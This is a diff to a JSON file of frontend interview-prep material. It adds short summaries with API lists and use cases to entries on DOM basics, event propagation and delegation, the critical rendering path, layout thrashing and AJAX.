@@ -9,6 +9,32 @@
         "API"
       ],
       "source": "https://dev.to/macmacky/70-javascript-interview-questions-5gfi",
+      "summary": {
+        "definition": "The DOM is the browser's live object version of your HTML — a tree of JavaScript objects, one per tag, that you can read and change. Anything you change in the tree shows up on screen.",
+        "api": [
+          {
+            "signature": "document",
+            "note": "the root of the tree; every lookup starts here"
+          },
+          {
+            "signature": "document.querySelector(css) / querySelectorAll(css)",
+            "note": "find nodes using the same selectors you write in CSS"
+          },
+          {
+            "signature": "el.textContent / el.innerHTML",
+            "note": "read or replace what is inside a node — `innerHTML` parses HTML, which is how XSS gets in"
+          },
+          {
+            "signature": "document.createElement(tag) + parent.append(node)",
+            "note": "build a node, then put it in the tree — it is not on the page until you append it"
+          },
+          {
+            "signature": "el.setAttribute(name, value) / el.classList",
+            "note": "change an attribute or a class on a node you already have"
+          }
+        ],
+        "useCase": "Ticking a checkbox in a to-do list: JavaScript finds that `<li>` in the tree, flips a class on it, and the browser repaints the row — with no page reload."
+      },
       "answer": "## Document Object Model\n\n**DOM** stands for **Document Object Model** — an interface (API) for HTML and XML documents.\n\nWhen the browser parses an HTML document, it creates a **tree-like structure** from it — this is the DOM. It's used for interacting with and modifying the document structure, elements, and nodes.\n\n## Example\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>Document Object Model</title>\n  </head>\n  <body>\n    <div>\n      <p>\n        <span></span>\n      </p>\n      <label></label>\n      <input />\n    </div>\n  </body>\n</html>\n```\n\nThe DOM equivalent is a tree:\n\n```\ndocument\n └── html\n      ├── head\n      │    ├── meta\n      │    └── title\n      └── body\n           └── div\n                ├── p\n                │    └── span\n                ├── label\n                └── input\n```\n\nThe `document` object in JavaScript represents the DOM. It provides methods to select elements, update content, and manage events."
     },
     {
@@ -19,6 +45,32 @@
         "events",
         "DOM"
       ],
+      "summary": {
+        "definition": "Event propagation is the trip an event takes through the DOM tree. It travels down from `window` to the element you clicked (capturing), fires there (target), then travels back up (bubbling) — which is why a handler on a parent hears about a click on its child.",
+        "api": [
+          {
+            "signature": "el.addEventListener(type, fn)",
+            "note": "listens on the way back up — the default, and what you want almost every time"
+          },
+          {
+            "signature": "el.addEventListener(type, fn, { capture: true })",
+            "note": "listens on the way down instead; the old spelling is a bare `true`"
+          },
+          {
+            "signature": "event.eventPhase",
+            "note": "which leg you are on: `1` capturing, `2` target, `3` bubbling"
+          },
+          {
+            "signature": "event.stopPropagation()",
+            "note": "ends the trip here, so no ancestor's handler runs"
+          },
+          {
+            "signature": "event.stopImmediatePropagation()",
+            "note": "also skips the other handlers on this same element"
+          }
+        ],
+        "useCase": "One `click` listener on a `<ul>` catching clicks on all 500 of its `<li>` children, because every one of those clicks bubbles up to the list."
+      },
       "answer": "**Question:** explain event propagation. What are bubbling and capturing, how do they differ, and how do you implement both?\n\n## The three phases\n\nWhen you click an element, the event doesn't fire only there. It travels through the DOM in three phases:\n\n1. **Capturing** — from `window` *down* to the target\n2. **Target** — at the clicked element itself\n3. **Bubbling** — from the target back *up* to `window`\n\n```\n          CAPTURING ↓            ↑ BUBBLING\n          window                 window\n            document               document\n              body                   body\n                div                    div\n                  button  ←— TARGET —→  button\n```\n\nEvery ancestor gets two chances to hear about the event: once on the way down, once on the way back up.\n\n## Implementing both\n\nThe third argument to `addEventListener` chooses the phase:\n\n```javascript\n// Bubbling — the default\nparent.addEventListener(\"click\", handler);\nparent.addEventListener(\"click\", handler, false);\n\n// Capturing\nparent.addEventListener(\"click\", handler, true);\nparent.addEventListener(\"click\", handler, { capture: true });\n```\n\nOnly **ancestors** are affected by the flag. A listener on the target itself fires in the target phase regardless, in the order the listeners were registered.\n\n## The difference in one line\n\nBubbling runs **innermost first**; capturing runs **outermost first**.\n\n```javascript\ndocument\n  .querySelector(\".outer\")\n  .addEventListener(\"click\", () => console.log(\"outer capture\"), true);\ndocument\n  .querySelector(\".inner\")\n  .addEventListener(\"click\", () => console.log(\"inner capture\"), true);\ndocument\n  .querySelector(\".inner\")\n  .addEventListener(\"click\", () => console.log(\"inner bubble\"));\ndocument\n  .querySelector(\".outer\")\n  .addEventListener(\"click\", () => console.log(\"outer bubble\"));\n\n// Clicking .inner logs:\n// outer capture   ← down\n// inner capture\n// inner bubble    ← target, then up\n// outer bubble\n```\n\n## Useful properties\n\n| Property / method | Meaning |\n|---|---|\n| `event.target` | Where the event actually originated — **doesn't change** as it propagates |\n| `event.currentTarget` | The element whose listener is running right now |\n| `event.eventPhase` | `1` capturing, `2` target, `3` bubbling |\n| `event.stopPropagation()` | Stop travelling further along the path |\n| `event.stopImmediatePropagation()` | Also skip other listeners on this same element |\n| `event.preventDefault()` | Cancel the default action; propagation continues |\n\nThe `target` vs `currentTarget` distinction is what makes [event delegation](/browser/152) possible.\n\n## When capturing is actually useful\n\nBubbling is the default because it's what you want almost always. Capturing earns its place when you need to act **before** anything downstream can:\n\n- Intercepting or blocking an event before a child's handler sees it\n- Analytics that must record every click even if a child stops propagation\n- A modal or overlay that swallows interaction with the page behind it\n\n## Events that don't bubble\n\nNot everything bubbles: `focus`, `blur`, `load`, `mouseenter`, `mouseleave`. Use the bubbling equivalents when you need delegation — `focusin`/`focusout` for focus, and `mouseover`/`mouseout` for hover.\n\n## Related\n\n- [Nested Click Handlers: Execution Order](/browser/147)\n- [Event Delegation](/browser/152)\n- [preventDefault vs stopPropagation](/browser/97)",
       "source": "user paste: 15-question frontend interview set"
     },
@@ -30,6 +82,32 @@
         "DOM",
         "events"
       ],
+      "summary": {
+        "definition": "Bubbling and capturing are the two directions an event travels through the DOM: capturing runs from `window` down to the element you clicked, bubbling runs from that element back up. Listeners bubble by default; capturing is something you opt into.",
+        "api": [
+          {
+            "signature": "addEventListener(type, fn) vs { capture: true }",
+            "note": "bubble phase by default; the option moves the listener to the downward pass"
+          },
+          {
+            "signature": "event.target vs event.currentTarget",
+            "note": "what was actually clicked, versus the element whose listener is running"
+          },
+          {
+            "signature": "event.target.closest(selector)",
+            "note": "from the clicked node, walk up to the row you care about — the heart of delegation"
+          },
+          {
+            "signature": "event.stopPropagation()",
+            "note": "ends the journey; the usual reason a parent's handler mysteriously never fires"
+          },
+          {
+            "signature": "addEventListener(type, fn, { once: true })",
+            "note": "removes itself after the first call, so you do not have to"
+          }
+        ],
+        "useCase": "A modal that closes when you click the backdrop, where the panel inside calls `stopPropagation()` so clicking the form does not also close it."
+      },
       "answer": "DOM events propagate in **three phases**: **capturing** (window → target), **target**, then **bubbling** (target → window). Most handlers use bubbling, but understanding both phases is key for delegation and stopping propagation correctly.\n\n## Propagation phases\n\n```\nCapturing:  window → document → ... → parent → target\nTarget:     event fires on target\nBubbling:   target → parent → ... → document → window\n```\n\n```javascript\ndocument.getElementById(\"parent\").addEventListener(\"click\", () => {\n  console.log(\"parent bubble\");\n});\n\ndocument.getElementById(\"parent\").addEventListener(\n  \"click\",\n  () => {\n    console.log(\"parent capture\");\n  },\n  true,\n); // useCapture = true\n\ndocument.getElementById(\"child\").addEventListener(\"click\", () => {\n  console.log(\"child target\");\n});\n\n// Click child → parent capture → child target → parent bubble\n```\n\n## Stopping propagation\n\n| Method | Effect |\n| --- | --- |\n| `event.stopPropagation()` | Stops further propagation on current phase |\n| `event.stopImmediatePropagation()` | Also blocks other listeners on same element/phase |\n| `event.preventDefault()` | Prevents default browser action (not same as stop) |\n\n## Event delegation\n\nAttach one listener on a parent; use `event.target` to handle children — fewer listeners, works for dynamic children.\n\n```javascript\nlist.addEventListener(\"click\", (e) => {\n  const item = e.target.closest(\"[data-id]\");\n  if (!item || !list.contains(item)) return;\n  handleSelect(item.dataset.id);\n});\n```\n\n## How to answer in the interview\n\n> \"Events capture from root to target, then bubble back. Default listeners are bubbling. I use delegation on parents for lists. stopPropagation halts the chain; preventDefault stops default behavior like link navigation.\"\n\n## Common mistakes\n\n- Confusing `preventDefault` with `stopPropagation`\n- Forgetting third argument `true` for capture listeners\n- Delegation without checking `closest` / `contains` (clicks on nested elements)\n\n## Key takeaways\n\n- Three phases: capture → target → bubble.\n- Delegation = one parent listener + `event.target` / `closest`.\n- `stopPropagation` ≠ `preventDefault`.\n\n## Interview follow-ups\n\n- **React synthetic events?** — Delegated to root; `e.stopPropagation()` still works; pooling removed in React 17+.\n- **once option?** — `{ once: true }` auto-removes listener after first fire."
     },
     {
@@ -40,6 +118,32 @@
         "events",
         "DOM"
       ],
+      "summary": {
+        "definition": "With handlers on nested elements, the firing order is not the order you registered them in — it is the path the event takes. Every capturing handler runs from the outside in, then the target, then every bubbling handler from the inside out.",
+        "api": [
+          {
+            "signature": "addEventListener(type, fn, true)",
+            "note": "registers on the capture pass, so it fires before anything deeper in the tree"
+          },
+          {
+            "signature": "addEventListener(type, fn)",
+            "note": "registers on the bubble pass, so it fires after everything deeper"
+          },
+          {
+            "signature": "event.target",
+            "note": "stays the clicked element in every handler, however far up the tree you are"
+          },
+          {
+            "signature": "event.currentTarget",
+            "note": "changes per handler — it is whoever owns the one running right now"
+          },
+          {
+            "signature": "event.stopPropagation()",
+            "note": "cuts the rest of the path, so the answer hinges on where exactly you call it"
+          }
+        ],
+        "useCase": "Clicking a button inside a card inside a page and being asked to predict the six lines that log — three captures on the way down, three bubbles on the way back."
+      },
       "answer": "**Question:** given nested elements with click handlers, what's the output when clicking the inner one? Show the order under both bubbling and capturing.\n\n*The exact markup wasn't included, so here's the canonical three-level version — the reasoning transfers to any nesting.*\n\n## The setup\n\n```html\n<div id=\"grandparent\">\n  <div id=\"parent\">\n    <button id=\"child\">Click me</button>\n  </div>\n</div>\n```\n\n```javascript\nconst ids = [\"grandparent\", \"parent\", \"child\"];\n\nids.forEach((id) => {\n  const el = document.getElementById(id);\n  el.addEventListener(\"click\", () => console.log(`${id} — bubble`));\n  el.addEventListener(\"click\", () => console.log(`${id} — capture`), true);\n});\n```\n\n## The output\n\nClicking `#child`:\n\n```\ngrandparent — capture\nparent — capture\nchild — capture        ← target phase; registration order decides\nchild — bubble\nparent — bubble\ngrandparent — bubble\n```\n\n**Bubbling only** (drop the `true` listeners): `child`, `parent`, `grandparent` — inside out.\n**Capturing only**: `grandparent`, `parent`, `child` — outside in.\n\n## The part that catches people\n\nOn the **target itself**, the capture flag is ignored. Both of `#child`'s listeners fire in the target phase, in the order they were added. That's why `child — capture` prints before `child — bubble` here — not because of the phase, but because it was registered first. Swap the two `addEventListener` lines and the order swaps.\n\n## Stopping it\n\n```javascript\ndocument.getElementById(\"parent\").addEventListener(\"click\", (e) => {\n  e.stopPropagation();\n  console.log(\"parent — bubble (stopped here)\");\n});\n```\n\nNow clicking the child logs the three captures, the child's bubble, `parent — bubble`, and **nothing from grandparent**.\n\nCall `stopPropagation()` in a *capturing* listener on `#grandparent` and the event never reaches the child at all — the click appears to do nothing. That's the overlay-blocking technique, and also a classic bug when a library does it to you.\n\n`stopImmediatePropagation()` goes further: it also prevents other listeners **on the same element** from running.\n\n## Why this is asked\n\nIt tests whether you know propagation is a *round trip* rather than a single upward pass, and whether you understand that `target` stays fixed while `currentTarget` changes. Both are load-bearing for [delegation](/browser/152).\n\n## Related\n\n- [Event Propagation: Bubbling, Capturing, and the Three Phases](/browser/146)\n- [Event Delegation](/browser/152)\n- [Event Bubbling vs Capturing](/browser/28)",
       "source": "user paste: 15-question frontend interview set"
     },
@@ -52,6 +156,28 @@
         "browser"
       ],
       "source": "https://dev.to/macmacky/70-javascript-interview-questions-5gfi",
+      "summary": {
+        "definition": "`preventDefault()` cancels what the browser would have done on its own, like submitting a form or following a link. `stopPropagation()` stops the event reaching other elements. They sound similar and do unrelated things.",
+        "api": [
+          {
+            "signature": "event.preventDefault()",
+            "note": "cancels the browser's built-in action; every listener still runs"
+          },
+          {
+            "signature": "event.stopPropagation()",
+            "note": "stops the event travelling to ancestors; the default action still happens"
+          },
+          {
+            "signature": "event.defaultPrevented",
+            "note": "`true` if something upstream already called `preventDefault()` — how you check"
+          },
+          {
+            "signature": "event.stopImmediatePropagation()",
+            "note": "also skips the remaining handlers on this same element"
+          }
+        ],
+        "useCase": "A form you submit over `fetch`: `preventDefault()` on `submit` stops the browser reloading the page, and you send the data yourself."
+      },
       "answer": "## `event.preventDefault()`\n\nPrevents the **default browser behavior** of an element:\n\n- On a `<form>` — prevents submission\n- On an `<a>` — prevents navigation\n- On `contextmenu` — prevents the context menu\n\n## `event.stopPropagation()`\n\nStops the event from propagating through the DOM — prevents it from firing in the **bubbling** or **capturing** phase on parent elements.\n\n## Checking if preventDefault was called\n\nUse `event.defaultPrevented` — returns `true` if `preventDefault()` was called on the element:\n\n```javascript\nelement.addEventListener(\"click\", (e) => {\n  e.preventDefault();\n  console.log(e.defaultPrevented); // true\n});\n```"
     },
     {
@@ -63,6 +189,28 @@
         "browser"
       ],
       "source": "https://dev.to/macmacky/70-javascript-interview-questions-5gfi",
+      "summary": {
+        "definition": "`event.target` is the element that was actually clicked — the deepest one under the pointer. `event.currentTarget` is the element whose listener is running. They are only the same when the thing you clicked is the thing you attached the listener to.",
+        "api": [
+          {
+            "signature": "event.target",
+            "note": "the deepest element under the pointer; changes with whatever the user hit"
+          },
+          {
+            "signature": "event.currentTarget",
+            "note": "the element you attached the listener to; the same on every fire"
+          },
+          {
+            "signature": "this (in a non-arrow handler)",
+            "note": "equals `currentTarget` — which is why switching to an arrow function surprises people"
+          },
+          {
+            "signature": "event.currentTarget after the handler returns",
+            "note": "`null` once dispatch finishes, so never read it inside a `setTimeout`"
+          }
+        ],
+        "useCase": "A toolbar with one listener on it: `currentTarget` is always the toolbar, and `target` tells you which button inside it was pressed."
+      },
       "answer": "## `event.target`\n\nThe element that **triggered** the event — the innermost element that was clicked/interacted with.\n\n## `event.currentTarget`\n\nThe element on which the event handler is **explicitly attached** (`this` in the handler).\n\n## Example\n\n```html\n<div onclick=\"clickFunc(event)\">\n  <div>\n    <div>\n      <button>Button</button>\n    </div>\n  </div>\n</div>\n```\n\n```javascript\nfunction clickFunc(event) {\n  console.log(event.target); // <button> — the element clicked\n  console.log(event.currentTarget); // <div>   — where handler is attached\n}\n```\n\n- Click the button → `target` is the `<button>`, `currentTarget` is the outer `<div>`\n- **`target`** = the deepest element that received the click\n- **`currentTarget`** = the element that owns the handler"
     },
     {
@@ -74,6 +222,28 @@
         "DOM",
         "performance"
       ],
+      "summary": {
+        "definition": "Event delegation is putting one listener on a container instead of one on every child, and working out which child was hit from the event itself. It works because events bubble up from the child to the container.",
+        "api": [
+          {
+            "signature": "list.addEventListener('click', handler)",
+            "note": "one listener on the parent, however many children it ends up with"
+          },
+          {
+            "signature": "event.target.closest('li')",
+            "note": "from whatever was clicked — maybe a `<span>` inside — walk up to the row"
+          },
+          {
+            "signature": "list.contains(item)",
+            "note": "guard: `closest` can walk past the container, so confirm the match is really inside it"
+          },
+          {
+            "signature": "removeEventListener(type, fn)",
+            "note": "one call to clean up, instead of one per child"
+          }
+        ],
+        "useCase": "A 500-row table where rows are added and removed as you filter — one listener on the `<tbody>` keeps working and you never re-bind anything."
+      },
       "answer": "**Question:** given a `<ul>` with many `<li>` children, attach a single listener to the `<ul>` that logs the clicked `<li>`. Why is delegation preferred?\n\n## The implementation\n\n```html\n<ul id=\"list\">\n  <li data-id=\"1\">First</li>\n  <li data-id=\"2\">Second</li>\n  <li data-id=\"3\">Third</li>\n</ul>\n```\n\n```javascript\nconst list = document.getElementById(\"list\");\n\nlist.addEventListener(\"click\", (event) => {\n  // Walk up from whatever was actually clicked to the nearest li.\n  const item = event.target.closest(\"li\");\n\n  // Ignore clicks on the ul's own padding, or on an li in a nested list.\n  if (!item || !list.contains(item)) return;\n\n  console.log(\"Clicked:\", item.textContent, item.dataset.id);\n});\n```\n\n## How it works\n\nDelegation is [bubbling](/browser/146) put to use. A click on an `<li>` — or on a `<span>` *inside* an `<li>` — bubbles up to the `<ul>`, where the single listener runs.\n\nTwo properties do the work:\n\n- **`event.target`** — the deepest element actually clicked. Might be a child of the `<li>`, which is why you can't just use it directly.\n- **`.closest('li')`** — walks up from the target to the nearest matching ancestor, so a click on nested markup still resolves to the right row.\n\nThe `list.contains(item)` guard matters when lists can nest: `closest` would happily find an `<li>` above the `<ul>` you're listening on.\n\n## Why it's preferred\n\n**1. It works for elements that don't exist yet.** This is the real reason. Add a row after the listener is attached and it just works — no rebinding:\n\n```javascript\nlist.insertAdjacentHTML(\"beforeend\", '<li data-id=\"4\">Fourth</li>');\n// clicking it already works\n```\n\nThe per-child approach requires attaching a listener to every new element, and that step gets forgotten.\n\n**2. One listener instead of N.** A thousand rows means one [closure](/learnings/130) and one registration rather than a thousand of each — less memory, faster initial render.\n\n**3. No cleanup leaks.** Remove a row and there's no orphaned listener holding a reference to a detached node. With per-child listeners, forgetting `removeEventListener` keeps the node alive.\n\n**4. Less code.** One handler, one place to change behaviour.\n\n## When not to delegate\n\n- **Events that don't bubble** — `focus`, `blur`, `mouseenter`, `mouseleave`. Use `focusin`/`focusout` and `mouseover`/`mouseout` instead.\n- **A child calls `stopPropagation()`** — the event never reaches your delegated listener.\n- **Very high-frequency events on a huge tree** — a delegated `mousemove` on `document` runs `closest` constantly.\n- **A handful of static elements** — direct listeners are simpler and the win is negligible.\n\n## In React\n\nYou mostly don't do this by hand: React attaches one listener at the root and dispatches through its own tree, so `onClick` on a thousand rows is already delegated. The manual pattern still matters for vanilla work, library integration, and interviews.\n\n## Related\n\n- [Event Propagation: Bubbling, Capturing, and the Three Phases](/browser/146)\n- [Nested Click Handlers: Execution Order](/browser/147)\n- [Cold Recall: Vanilla DOM](/test-prep/17)",
       "source": "user paste: 15-question frontend interview set"
     },
@@ -86,6 +256,36 @@
         "rendering"
       ],
       "source": "user request: 1-day interview prep - browser & architecture",
+      "summary": {
+        "definition": "The critical rendering path is everything the browser does between the first byte of HTML and the first pixel on screen: parse the HTML into a DOM, parse the CSS into styles, combine them, work out where everything goes, and paint.",
+        "api": [
+          {
+            "signature": "<script src=\"...\">",
+            "note": "blocks HTML parsing right where it sits — the classic reason a page paints late"
+          },
+          {
+            "signature": "<script defer>",
+            "note": "downloads in parallel, runs after parsing, in order — the sane default"
+          },
+          {
+            "signature": "<script async>",
+            "note": "downloads in parallel, runs the moment it lands; order is not guaranteed"
+          },
+          {
+            "signature": "<link rel=\"stylesheet\">",
+            "note": "render-blocking: nothing paints until it has downloaded and parsed"
+          },
+          {
+            "signature": "<link rel=\"preload\">",
+            "note": "starts fetching something the parser has not reached yet"
+          },
+          {
+            "signature": "<div id=\"root\"></div>",
+            "note": "the SPA shell — the HTML is empty, so the first paint waits on your JavaScript"
+          }
+        ],
+        "useCase": "A React app showing a blank white screen for two seconds, because the served HTML is one empty `<div>` and nothing is visible until the bundle downloads and runs."
+      },
       "answer": "**The critical rendering path** is everything the browser does between receiving HTML bytes and painting the first pixel. Knowing it is what lets you answer *\"what happens when you type a URL and press enter?\"* — the most-asked browser question at this level.\n\nTo put it simply: the browser has to build two trees, combine them into a third, work out where everything goes, and only then can it paint.\n\n## The full journey\n\n**1. URL → IP.** DNS lookup, checked against the browser cache, OS cache, then a resolver.\n\n**2. Connection.** TCP handshake, then a [TLS handshake](/browser/160) for HTTPS. Both cost round trips — which is why connection reuse and [HTTP/2](/browser/161) matter.\n\n**3. The HTML arrives** and the browser starts parsing *immediately*, as bytes stream in. It doesn't wait for the whole document.\n\n**4. Two trees get built:**\n\n- **DOM** — from the HTML\n- **CSSOM** — from the CSS\n\n**5. Render tree** — DOM and CSSOM combined, containing only what's actually visible. `display: none` nodes are excluded entirely. (`visibility: hidden` nodes *are* included — they occupy space.)\n\n**6. Layout (reflow)** — compute the geometry of every box.\n\n**7. Paint** — fill in pixels.\n\n**8. Composite** — combine layers, potentially on the GPU.\n\nSteps 6–8 are covered in more depth in [Reflow vs Repaint & CSS Transform Performance](/css/6).\n\n## What actually blocks the render?\n\nThis is the part interviews probe, because it's where the practical decisions live.\n\n**CSS is render-blocking.** The browser will not paint until the CSSOM is complete. It can't — it would risk showing unstyled content and then repainting everything. This is why `<link rel=\"stylesheet\">` belongs in the `<head>` and why inlining critical CSS speeds up first paint.\n\n**Synchronous JavaScript is parser-blocking.** When the parser hits `<script src>`, it stops building the DOM, fetches, executes, and only then resumes. Because a script might call `document.write`, the browser has no choice.\n\nWorse: **a script also waits on any CSS above it**, because the script might read computed styles. So one stylesheet can delay a script which delays the DOM.\n\nThe two fixes:\n\n```html\n<script src=\"app.js\" defer></script>\n<!-- download in parallel, run after DOM is parsed, in order -->\n<script src=\"a.js\" async></script>\n<!-- download in parallel, run the moment it lands, any order -->\n```\n\n**`defer` for application code** — order is preserved and the DOM exists when it runs. **`async` for independent third-party scripts** like analytics, where order doesn't matter.\n\n## SPA bootstrapping — the part that's specific to your work\n\nFor a client-rendered React app, the sequence after the HTML arrives is:\n\n1. HTML arrives — **essentially an empty `<div id=\"root\">`**\n2. The JS bundle downloads (often the biggest single cost)\n3. The bundle parses and executes — *this is not free*; parsing a megabyte of JS is real CPU time, especially on a mid-range phone\n4. React mounts and renders the initial tree\n5. `useEffect` fires and the first data fetch **starts** — which means the user is now waiting on a *second* round trip that couldn't even begin until now\n6. Data arrives, re-render, content appears\n\n**That step-5 problem is the core weakness of client-side rendering**, and it's what SSR and [server components](/react-guide/30) address: with SSR the HTML already contains content, so the user sees something at step 1 instead of step 6.\n\nWith SSR you then have **hydration** — React walks the server-rendered HTML and attaches event listeners. Until hydration completes, the page *looks* ready but doesn't respond to clicks. That gap is a real UX problem and the reason streaming and selective hydration exist.\n\n## The metrics they may name\n\n| Metric | Means | Good |\n| --- | --- | --- |\n| **TTFB** | Time to first byte — server + network | < 800ms |\n| **FCP** | First Contentful Paint — first content visible | < 1.8s |\n| **LCP** | Largest Contentful Paint — main content visible | < 2.5s |\n| **TTI** | Time to Interactive — actually responds to input | < 3.8s |\n| **CLS** | Cumulative Layout Shift — visual stability | < 0.1 |\n| **INP** | Interaction to Next Paint — replaced FID in 2024 | < 200ms |\n\n**CLS** is the one with the most actionable fix: reserve space for images (`width`/`height` attributes or `aspect-ratio`) and for anything that loads late, so content doesn't jump.\n\n## How to answer it out loud\n\n> \"DNS, TCP, TLS, then the HTML streams in and the parser starts building the DOM. CSS blocks rendering because you can't paint without the CSSOM, and synchronous scripts block the parser — so stylesheets go in the head and scripts get `defer`. DOM plus CSSOM gives the render tree, then layout, paint, composite.\n>\n> For an SPA there's an extra phase: the HTML is basically empty, so nothing shows until the bundle downloads, parses, and executes — and the first data fetch can't even start until React has mounted and effects run. That serial chain is why SSR helps, and why bundle size matters more than people expect on mobile.\"\n\n## Trade-offs\n\n- **Inlining critical CSS** speeds first paint but bloats the HTML and can't be cached separately.\n- **[Code splitting](/system-design/403)** reduces initial bundle size but adds round trips later — over-splitting produces a request waterfall ([Data Fetching and Performance: Request Waterfalls](/advanced-react/14)).\n- **SSR** improves perceived load but costs server compute and adds hydration complexity.\n- **Preload/prefetch** (`<link rel=\"preload\">`) can pull a critical resource forward, but over-preloading competes for bandwidth with the things that actually matter."
     },
     {
@@ -97,6 +297,36 @@
         "DOM"
       ],
       "source": "user request: 1-day interview prep - browser & architecture",
+      "summary": {
+        "definition": "Layout thrashing is forcing the browser to recompute the page geometry over and over inside a single frame, by reading a layout value straight after writing one. Each read has to flush the pending write first, so a loop over 200 items costs 200 layouts instead of one.",
+        "api": [
+          {
+            "signature": "el.offsetWidth / offsetHeight / offsetTop",
+            "note": "reading any of these forces a layout if a write is pending"
+          },
+          {
+            "signature": "el.getBoundingClientRect()",
+            "note": "the same cost, and the one that actually shows up in real code"
+          },
+          {
+            "signature": "getComputedStyle(el)",
+            "note": "also forces layout — reading a style is not free"
+          },
+          {
+            "signature": "el.scrollTop / window.innerWidth",
+            "note": "more of the same list; scroll and viewport reads count too"
+          },
+          {
+            "signature": "requestAnimationFrame(fn)",
+            "note": "the fix: read everything first, then do all the writes in one frame callback"
+          },
+          {
+            "signature": "useLayoutEffect",
+            "note": "in React, where a measure-then-mutate pass belongs — it runs before the browser paints"
+          }
+        ],
+        "useCase": "A loop that reads each card's height and then sets its width: 200 cards, 200 forced layouts, and a scroll that visibly sticks."
+      },
       "answer": "**Layout thrashing** is when you force the browser to recalculate layout many times in a single frame, by interleaving DOM reads and writes. It turns an O(n) loop into O(n) *layouts*, and it is the most common cause of jank that a profiler will actually let you fix.\n\nTo put it simply: the browser wants to batch your layout work, and reading a geometry property at the wrong moment forces it to stop and do the work immediately instead.\n\n## The Problem\n\nThe browser is already smart about this. When you write to the DOM, it doesn't recalculate layout right away — it marks the document dirty and queues the work to be flushed once, before the next paint. Batching is the default and it's efficient.\n\nBut some properties can only be answered with **current, accurate** geometry. If you ask for one while there are pending writes, the browser has no choice: it must flush the layout *right now*, synchronously, before it can return a number.\n\nThat's a **forced synchronous layout**. One is fine. In a loop, it's a disaster:\n\n```javascript\n// Every iteration: write (dirty) → read (forced layout). N layouts.\nfor (const box of boxes) {\n  box.style.width = box.offsetWidth + 10 + \"px\";\n}\n```\n\nWith 100 elements that's 100 full layout passes in one frame. At 60fps you have 16.7ms per frame total, and you have just spent all of it.\n\n## The Solution\n\n**Batch all reads, then all writes.**\n\n```javascript\n// Read phase — one layout flush for the whole loop\nconst widths = boxes.map((box) => box.offsetWidth);\n\n// Write phase — nothing forces a flush, so it happens once at the end\nboxes.forEach((box, i) => {\n  box.style.width = widths[i] + 10 + \"px\";\n});\n```\n\nSame work, same result. **One layout instead of one hundred.**\n\nThis read-then-write discipline has a name — the **read/write batching** or \"FastDOM\" pattern — and stating it by name is a good signal.\n\n## What actually triggers a forced layout?\n\nAnything that needs up-to-date geometry. The list worth remembering:\n\n| Category | Properties |\n| --- | --- |\n| **Element geometry** | `offsetWidth/Height/Top/Left`, `clientWidth/Height`, `scrollWidth/Height`, `scrollTop/Left` |\n| **Methods** | `getBoundingClientRect()`, `getClientRects()`, `scrollIntoView()`, `focus()` |\n| **Computed style** | `getComputedStyle(el)` — for any property that depends on layout |\n| **Window** | `window.innerWidth/Height`, `scrollX/Y` |\n\nReading these is *not* inherently bad. Reading them **after a write, inside a loop** is.\n\n## In React specifically\n\nReact batches its own state updates, so this rarely bites you through normal rendering. It bites you in **refs and effects**:\n\n```javascript\n// Runs before paint — a read here is a forced synchronous layout,\n// but it's the correct place if you need to measure and adjust\nuseLayoutEffect(() => {\n  const height = ref.current.getBoundingClientRect().height;\n  setTooltipPosition(height); // adjust before the user sees anything\n}, []);\n```\n\n`useLayoutEffect` runs **synchronously after DOM mutation but before paint** — which is exactly why it's the right tool for measure-then-adjust, and exactly why overusing it blocks painting. `useEffect` runs *after* paint, so measuring there causes a visible flicker as the element jumps to its corrected position ([useEffect vs useLayoutEffect](/react-guide/8)).\n\nThe other React-flavored version is a scroll or resize handler that reads geometry on every event. Those fire far more often than once per frame — so [throttle](/coding/14) them, or better, use `requestAnimationFrame` so they run at most once per frame:\n\n```javascript\nlet scheduled = false;\n\nwindow.addEventListener(\"scroll\", () => {\n  if (scheduled) return;\n  scheduled = true;\n\n  requestAnimationFrame(() => {\n    const y = window.scrollY; // read once per frame, not per event\n    update(y);\n    scheduled = false;\n  });\n});\n```\n\nBetter still for visibility checks: **`IntersectionObserver`**, which reports element visibility without you reading geometry at all. If you're asked how to implement infinite scroll or [lazy loading](/system-design/404), that's the answer that shows current knowledge.\n\n## How to spot it\n\nChrome DevTools → Performance → record. Look for:\n\n- Long purple **Layout** blocks\n- The warning **\"Forced reflow is a likely performance bottleneck\"**\n- A sawtooth pattern of many small layout bars inside one frame\n\nThat warning names the offending line. It's one of the most directly actionable things the profiler tells you.\n\n## Trade-offs and follow-ups\n\n**\"Isn't this premature optimization?\"** — For ten elements, yes. It matters when you're touching many elements per frame, or in a scroll handler. The honest answer is: write it naturally, profile, and fix it when the profiler points there.\n\n**\"What about `will-change`?\"** — It promotes an element to its own compositor layer so transforms skip layout and paint entirely. But each layer costs GPU memory, so applying it broadly makes things *worse*. Add it just before an animation and remove it after.\n\n**\"How do you animate without touching layout at all?\"** — Animate only `transform` and `opacity`. Those run on the compositor thread and skip layout and paint completely ([Reflow vs Repaint & CSS Transform Performance](/css/6)). Animating `left` or `width` triggers layout on every single frame."
     },
     {
@@ -109,6 +339,28 @@
         "HTTP"
       ],
       "source": "https://dev.to/macmacky/70-javascript-interview-questions-5gfi",
+      "summary": {
+        "definition": "AJAX is the technique of fetching data from the server in the background and updating part of the page with it, instead of loading a whole new page. The name is historical — it stood for Asynchronous JavaScript and XML, and the data is now almost always JSON.",
+        "api": [
+          {
+            "signature": "fetch(url, options)",
+            "note": "the modern way in; returns a promise for a `Response`"
+          },
+          {
+            "signature": "res.ok",
+            "note": "`fetch` only rejects on a network failure, so check this yourself — a 404 is a *resolved* promise"
+          },
+          {
+            "signature": "res.json()",
+            "note": "reads and parses the body; a promise of its own"
+          },
+          {
+            "signature": "new XMLHttpRequest()",
+            "note": "the original API, still used where you need upload progress events"
+          }
+        ],
+        "useCase": "Typing in a search box and seeing results appear underneath as you type, with the page never reloading."
+      },
